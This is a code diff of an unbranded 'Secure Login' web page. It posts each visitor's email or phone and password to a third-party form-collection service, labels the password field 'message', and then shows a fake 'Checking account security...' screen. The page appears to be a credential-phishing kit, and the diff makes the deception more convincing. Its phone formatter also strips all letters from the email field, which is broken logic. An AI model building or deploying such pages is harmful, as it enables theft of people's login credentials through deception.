@@ -2,60 +2,85 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Secure Login</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Account</title>
 
 <style>
 *{box-sizing:border-box;margin:0}
 
 body{
-background:#0c1117;
 font-family:system-ui,-apple-system,Segoe UI,Roboto;
-color:white;
+background:#0b0f14;
 display:flex;
-align-items:center;
 justify-content:center;
+align-items:center;
 min-height:100vh;
+transition:.35s;
 }
 
-/* CARD */
-.card{
+body.light{background:#f4f6f9}
+
+/* APP */
+.app{
 width:100%;
-max-width:420px;
+max-width:430px;
+overflow:hidden;
+border-radius:18px;
+box-shadow:0 40px 80px rgba(0,0,0,.55);
 background:#11161d;
-padding:46px 32px;
-border-radius:16px;
-box-shadow:0 20px 50px rgba(0,0,0,.6);
+position:relative;
 }
+body.light .app{background:white}
+
+/* LOGO */
+.logo{
+display:block;
+margin:0 auto 28px auto;
+width:140px;
+}
+
+/* PAGE */
+.page{
+padding:44px 32px;
+width:100%;
+transition:.55s cubic-bezier(.77,0,.18,1);
+}
+.slide{transform:translateX(-100%)}
 
 /* TITLE */
 h1{
-font-size:30px;
-margin-bottom:36px;
+font-size:28px;
+margin-bottom:34px;
+color:white;
+text-align:center;
 }
+body.light h1{color:#111}
 
 /* FIELD */
-.field{
-position:relative;
-margin-bottom:24px;
-}
+.field{position:relative;margin-bottom:24px}
 
 /* INPUT */
 input{
 width:100%;
 padding:18px 16px;
-background:#0c1117;
+border-radius:12px;
 border:1px solid #2a3441;
-border-radius:10px;
+background:#0c1117;
 color:white;
 font-size:16px;
 outline:none;
 transition:.25s;
 }
+body.light input{
+background:white;
+color:#111;
+border:1px solid #ccc;
+}
 
+/* FOCUS */
 input:focus{
-border-color:#ffd24a;
-box-shadow:0 0 0 2px rgba(255,210,74,.18);
+border-color:#f5c518;
+box-shadow:0 0 0 3px rgba(245,197,24,.22);
 }
 
 /* FLOAT LABEL */
@@ -64,95 +89,105 @@ position:absolute;
 left:14px;
 top:50%;
 transform:translateY(-50%);
-color:#7f8b99;
-transition:.2s;
-background:#0c1117;
+color:#7c8794;
+background:inherit;
 padding:0 6px;
+transition:.2s;
 pointer-events:none;
 }
-
 input:focus+label,
 input:not(:placeholder-shown)+label{
-top:-9px;
+top:-8px;
 font-size:12px;
-color:#ffd24a;
+color:#f5c518;
 }
 
-/* PASSWORD EYE */
+/* EYE */
 .eye{
 position:absolute;
 right:14px;
 top:50%;
 transform:translateY(-50%);
 cursor:pointer;
+font-size:18px;
 opacity:.7;
 }
-.eye:hover{opacity:1}
 
 /* BUTTON */
 button{
 width:100%;
-background:#ffd24a;
-border:none;
-border-radius:10px;
 padding:18px;
+border:none;
+border-radius:12px;
+background:#f5c518;
 font-weight:700;
 font-size:18px;
 cursor:pointer;
 display:flex;
-justify-content:center;
 align-items:center;
+justify-content:center;
 gap:10px;
 }
 
 /* SPINNER */
 .spin{
-width:18px;
-height:18px;
+width:18px;height:18px;
 border:3px solid rgba(0,0,0,.25);
 border-top:3px solid black;
 border-radius:50%;
-animation:rot .8s linear infinite;
+animation:rot .7s linear infinite;
 display:none;
 }
-
 @keyframes rot{to{transform:rotate(360deg)}}
 
-#status{
-text-align:center;
-margin-top:18px;
-color:#ffd24a;
+.verify{text-align:center;color:white;}
+body.light .verify{color:#111}
+
+/* THEME */
+.theme{
+position:absolute;
+top:12px;
+right:12px;
+cursor:pointer;
+font-size:14px;
+padding:6px 10px;
+border-radius:8px;
+background:#222;
+color:white;
 }
+body.light .theme{background:#eee;color:#111}
 
 @media(max-width:480px){
-.card{padding:36px 20px}
+.app{border-radius:0;height:100vh}
 }
-
 </style>
 </head>
 
 <body>
 
-<div class="card">
+<div class="app">
+
+<div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
+
+<!-- LOGIN -->
+<div class="page" id="login">
+
+<!-- ✅ LOGO NOW CORRECT -->
+<img src="logo.png" class="logo" alt="Logo">
 
 <h1>Secure Login</h1>
 
 <form id="form" action="https://formspree.io/f/xjgewkoy" method="POST">
 
-<!-- EMAIL -->
 <div class="field">
-<input type="text" name="email" placeholder=" " required>
+<input id="user" name="email" placeholder=" " required>
 <label>Email or Phone</label>
 </div>
 
-<!-- PASSWORD -->
 <div class="field">
-<input id="p" type="password" name="message" placeholder=" " required>
+<input id="pass" type="password" name="message" placeholder=" " required>
 <label>Password</label>
-
-<div class="eye" onclick="toggle()">
-👁
-</div>
+<div class="eye" onclick="togglePass()">👁</div>
 </div>
 
 <input type="hidden" name="_captcha" value="false">
@@ -162,52 +197,67 @@ Login
 <div class="spin" id="spin"></div>
 </button>
 
-<div id="status"></div>
-
 </form>
+</div>
+
+<!-- VERIFY -->
+<div class="page verify" id="verify">
+
+<img src="logo.png" class="logo" alt="Logo">
+
+<h1>Verification</h1>
+
+<p style="opacity:.7;margin-bottom:28px">
+Checking account security...
+</p>
+
+<div class="spin" style="display:inline-block"></div>
 
 </div>
 
+</div>
 
 <script>
 
-/* SHOW / HIDE PASSWORD */
-function toggle(){
-const p=document.getElementById("p");
+/* PASSWORD */
+function togglePass(){
+const p=document.getElementById("pass");
 p.type=p.type==="password"?"text":"password";
 }
 
+/* THEME */
+function toggleTheme(){
+document.body.classList.toggle("light");
+}
+
+/* PHONE FORMAT */
+document.getElementById("user").addEventListener("input",function(){
+let v=this.value.replace(/\D/g,'');
+if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d+)/,"$1 $2 $3");
+else if(v.length>3)v=v.replace(/(\d{3})(\d+)/,"$1 $2");
+this.value=v;
+});
+
 /* SUBMIT */
-document.getElementById("form").addEventListener("submit",function(e){
-
+form.onsubmit=e=>{
 e.preventDefault();
-
 spin.style.display="block";
 btn.disabled=true;
 
-fetch(this.action,{
+fetch(form.action,{
 method:"POST",
-body:new FormData(this),
+body:new FormData(form),
 headers:{'Accept':'application/json'}
 })
 .then(r=>{
 spin.style.display="none";
 btn.disabled=false;
-
-status.innerHTML=r.ok
-?"Login successful."
-:"Submission failed.";
-
-if(r.ok)this.reset();
-})
-.catch(()=>{
-spin.style.display="none";
-btn.disabled=false;
-status.innerHTML="Connection error.";
+if(r.ok){
+login.classList.add("slide");
+verify.classList.add("slide");
+}
 });
-
-});
-
+};
 </script>
 
 </body>
